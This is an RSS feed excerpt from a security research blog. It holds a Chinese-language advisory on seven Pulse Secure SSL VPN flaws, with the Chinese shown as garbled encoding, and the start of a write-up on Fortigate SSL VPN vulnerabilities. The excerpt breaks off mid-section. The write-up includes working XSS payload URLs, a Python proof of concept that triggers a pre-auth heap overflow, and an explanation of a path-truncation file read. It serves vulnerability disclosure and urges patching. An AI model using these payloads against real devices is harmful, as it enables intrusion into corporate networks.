                <description>&lt;h3 id=&quot;ÂÖßÂÆπ&quot;&gt;ÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Âú®ÊàëÂÄëÂ∞ç Pulse Secure SSL VPN ÁöÑÂÆâÂÖ®Á†îÁ©∂‰∏≠ÔºåÂÖ±ÁôºÁèæ‰∫Ü‰∏ãÂàó‰∏ÉÂÄãÂº±Èªû„ÄÇÁµÑÂêàÂà©Áî®ÊúâÊ©üÊúÉÂèñÂæó SSL VPN Ë®≠ÂÇôÁöÑÊúÄÈ´òÊ¨äÈôêÔºåÂèØËÆìÊîªÊìäËÄÖÈÄ≤ÂÖ•Áî®Êà∂ÂÖßÁ∂≤ÔºåÁîöËá≥ÊéßÂà∂ÊØèÂÄãÈÄèÈÅé SSL VPN ÈÄ£Á∑öÁöÑ‰ΩøÁî®ËÄÖË£ùÁΩÆ„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂèóÂΩ±ÈüøÁöÑÁâàÊú¨Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁõÆÂâçÂ∑≤Á∂ìÂá∫ÁèæÊîªÊìäËÄÖÂ∞çÂÖ®‰∏ñÁïåË®≠ÂÇôÈÄ≤Ë°åÂ§ßË¶èÊ®°ÊéÉÊèèÔºåË´ã Pulse Secure SSL VPN Áî®Êà∂&lt;strong&gt;ÂÑòÈÄüÊõ¥Êñ∞&lt;/strong&gt;ÔºåÈúÄË¶ÅÊõ¥Êñ∞ÁöÑÁâàÊú¨Ë≥áÊ∫êÂèØÂèÉËÄÉ&lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101&quot;&gt;ÂéüÂª† Pulse Secure ÁöÑÂÖ¨Âëä&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Á¥∞ÁØÄ&quot;&gt;Á¥∞ÁØÄ&lt;/h3&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÊäÄË°ìÁ¥∞ÁØÄË´ãÂèÉÈñ±ÊàëÂÄëÁöÑ AdvisoryÔºö
&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâç‰∫¶ÁôºÁèæÊîªÊìäËÄÖÂ∞çÊàëÂÄë‰πãÂâçÁôºË°®ÁöÑ &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;Fortigate SSL VPN&lt;/a&gt; Âèä &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt; Âº±ÈªûÈÄ≤Ë°åÂ§ßË¶èÊ®°ÊéÉÊèèÔºåÂÜçÊ¨°ÊèêÈÜíË´ãÁî®Êà∂ÂÑòÈÄüÊõ¥Êñ∞‰ª•‰∏ä SSL VPN Ë®≠ÂÇôËá≥ÊúÄÊñ∞Áâà„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory</guid>
                <pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
                <description>&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
  &lt;li&gt;and more ‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;lets-start&quot;&gt;Let‚Äôs start!&lt;/h1&gt;

&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;

&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;

&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;

&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;

&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;All-in-one binary
  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web daemon
  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;

    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;

    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;WebVPN
  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
&lt;p&gt;There are several XSS:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;(&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;)&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;amp;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, there is an inconsistency between length calculation and encoding process. The encode part does not handle that much.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;#60;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we input a malicious string like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;lt;&amp;lt;&amp;lt;;&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is still encoded into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, so the result should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#&amp;amp;#60;&amp;amp;#60;&amp;amp;#60;;&lt;/code&gt;! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;x&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&apos;msg&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;amp;#&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;;&amp;lt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn:4433/message&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13382-the-magic-backdoor&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-389&quot;&gt;CVE-2018-13382&lt;/a&gt;: The magic backdoor&lt;/h3&gt;
&lt;p&gt;In the login page, we found a special parameter called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic&lt;/code&gt;. Once the parameter meets a hardcoded string, we can modify any user‚Äôs password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to our survey, there are still plenty of Fortigate SSL VPN lack of patch. Therefore, considering its severity, we will not disclose the magic string. However, this vulnerability has been &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240&quot;&gt;reproduced by the researcher from CodeWhite&lt;/a&gt;. It is surely that other attackers will exploit this vulnerability soon! Please update your Fortigate ASAP!&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;zh-tw&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Critical vulns in &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; reversed &amp;amp; exploited by our colleagues &lt;a href=&quot;https://twitter.com/niph_?ref_src=twsrc%5Etfw&quot;&gt;@niph_&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ramoliks?ref_src=twsrc%5Etfw&quot;&gt;@ramoliks&lt;/a&gt; - patch your &lt;a href=&quot;https://twitter.com/hashtag/FortiOS?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#FortiOS&lt;/a&gt; asap and see the &lt;a href=&quot;https://twitter.com/hashtag/bh2019?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#bh2019&lt;/a&gt; talk of &lt;a href=&quot;https://twitter.com/orange_8361?ref_src=twsrc%5Etfw&quot;&gt;@orange_8361&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mehqq_?ref_src=twsrc%5Etfw&quot;&gt;@mehqq_&lt;/a&gt; for details (tnx guys for the teaser that got us started) &lt;a href=&quot;https://t.co/TLLEbXKnJ4&quot;&gt;pic.twitter.com/TLLEbXKnJ4&lt;/a&gt;&lt;/p&gt;&amp;mdash; Code White GmbH (@codewhitesec) &lt;a href=&quot;https://twitter.com/codewhitesec/status/1145967317672714240?ref_src=twsrc%5Etfw&quot;&gt;2019Âπ¥7Êúà2Êó•&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;cve-2018-13383-post-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-388&quot;&gt;CVE-2018-13383&lt;/a&gt;: Post-auth heap overflow&lt;/h3&gt;

&lt;p&gt;This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:&lt;/p&gt;
